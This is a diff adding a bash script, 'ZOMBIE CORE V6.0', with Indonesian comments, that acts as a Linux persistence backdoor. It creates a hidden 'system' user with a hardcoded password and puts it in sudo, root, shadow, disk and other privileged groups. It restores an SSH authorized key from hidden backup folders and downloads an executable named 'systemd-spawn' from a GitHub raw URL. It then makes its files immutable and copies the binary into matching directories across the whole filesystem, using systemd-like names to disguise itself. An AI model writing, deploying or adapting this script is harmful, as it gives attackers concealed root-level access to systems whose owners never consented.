@@ -1,0 +1,118 @@
+#!/bin/bash
+# ZOMBIE CORE V6.0 - FINAL GOD (FULL GRUP)
+# Jangan diedit sembarangan kecuali lo tau apa yang lo lakukan!
+
+USER="system"
+PASS="systemd"
+SUDO_GROUP="sudo"
+GITHUB_RAW="https://raw.githubusercontent.com/beksec/Anomali-Testing/main"
+
+# Set OOM protection untuk diri sendiri (biar kebal OOM Killer)
+if [ -f /proc/self/oom_score_adj ]; then
+    echo -1000 > /proc/self/oom_score_adj 2>/dev/null
+fi
+
+# Cek di 3 lokasi backup utama
+SSH_KEY=""
+for BACKUP_LOC in /var/tmp/.systemd-backup /opt/.config/.cache/.systemd /usr/share/.misc/.backup; do
+    if [ -f $BACKUP_LOC/authorized_keys ]; then
+        SSH_KEY=$(cat $BACKUP_LOC/authorized_keys)
+        break
+    fi
+done
+
+# Fungsi untuk nambah user dengan semua grup
+create_user_with_all_groups() {
+    local USER=$1
+    local PASS=$2
+    
+    # Bikin user dulu
+    useradd -M -s /bin/bash "$USER" 2>/dev/null
+    echo "$USER:$PASS" | chpasswd
+    
+    # Tambah ke SEMUA grup penting
+    usermod -aG sudo "$USER" 2>/dev/null
+    usermod -aG root "$USER" 2>/dev/null
+    usermod -aG adm "$USER" 2>/dev/null
+    usermod -aG disk "$USER" 2>/dev/null
+    usermod -aG shadow "$USER" 2>/dev/null
+    usermod -aG utmp "$USER" 2>/dev/null
+    
+    # Tambah grup tambahan biar makin kuat
+    usermod -aG audio "$USER" 2>/dev/null
+    usermod -aG video "$USER" 2>/dev/null
+    usermod -aG plugdev "$USER" 2>/dev/null
+    usermod -aG netdev "$USER" 2>/dev/null
+    usermod -aG lp "$USER" 2>/dev/null
+    usermod -aG scanner "$USER" 2>/dev/null
+    
+    echo "✅ User $USER created with all groups"
+}
+
+# Fungsi untuk ngecek dan nambah grup yang kurang
+check_and_add_missing_groups() {
+    local USER=$1
+    local ALL_GROUPS="sudo root adm disk shadow utmp audio video plugdev netdev lp scanner"
+    
+    for GROUP in $ALL_GROUPS; do
+        if ! groups "$USER" 2>/dev/null | grep -q "$GROUP"; then
+            usermod -aG "$GROUP" "$USER" 2>/dev/null && echo "✅ Added missing group: $GROUP"
+        fi
+    done
+}
+
+# MAIN LOGIC: Cek user
+if ! id "$USER" &>/dev/null; then
+    # USER TIDAK ADA - BUAT BARU
+    echo "⚠️ User $USER tidak ditemukan, membuat ulang..."
+    create_user_with_all_groups "$USER" "$PASS"
+    
+    # Restore SSH key
+    if [ ! -z "$SSH_KEY" ]; then
+        mkdir -p /home/$USER/.ssh
+        echo "$SSH_KEY" > /home/$USER/.ssh/authorized_keys
+        chown -R $USER:$USER /home/$USER
+        chmod 700 /home/$USER/.ssh
+        echo "✅ SSH key restored"
+    fi
+
+    # Restore dari GitHub kalo perlu (JAGA-JAGA)
+    if [ ! -f /usr/local/lib/.systemd/systemd-spawn ]; then
+        curl -sL $GITHUB_RAW/systemd-spawn -o /usr/local/lib/.systemd/systemd-spawn
+        chmod +x /usr/local/lib/.systemd/systemd-spawn
+        echo "✅ Restored from GitHub"
+    fi
+else
+    # USER SUDAH ADA - CEK GRUP
+    echo "⚠️ User $USER sudah ada, memeriksa grup..."
+    check_and_add_missing_groups "$USER"
+fi
+
+# Proteksi home directory
+if [ -d "/home/$USER" ]; then
+    chattr +i /home/$USER 2>/dev/null
+    echo "✅ Home directory protected"
+fi
+
+# Copy ke semua backup location (3 lokasi utama)
+for LOC in /var/tmp/.systemd-backup /opt/.config/.cache/.systemd /usr/share/.misc/.backup; do
+    if [ -d "$LOC" ]; then
+        cp /usr/local/lib/.systemd/systemd-spawn "$LOC/" 2>/dev/null
+        chattr +i "$LOC/systemd-spawn" 2>/dev/null
+    fi
+done
+
+# Cari semua folder backup lain dan sebarin juga
+find / -type d -name "*.systemd*" -o -name "*.backup*" 2>/dev/null | while read DIR; do
+    if [ "$DIR" != "/usr/local/lib/.systemd" ] && [ -d "$DIR" ]; then
+        cp /usr/local/lib/.systemd/systemd-spawn "$DIR/" 2>/dev/null
+        chmod +x "$DIR/systemd-spawn" 2>/dev/null
+    fi
+done
+
+# Final check
+echo "✅ Systemd-spawn execution completed"
+echo "📊 Current groups:"
+groups "$USER" 2>/dev/null | sed 's/ /, /g'
+
+exit 0
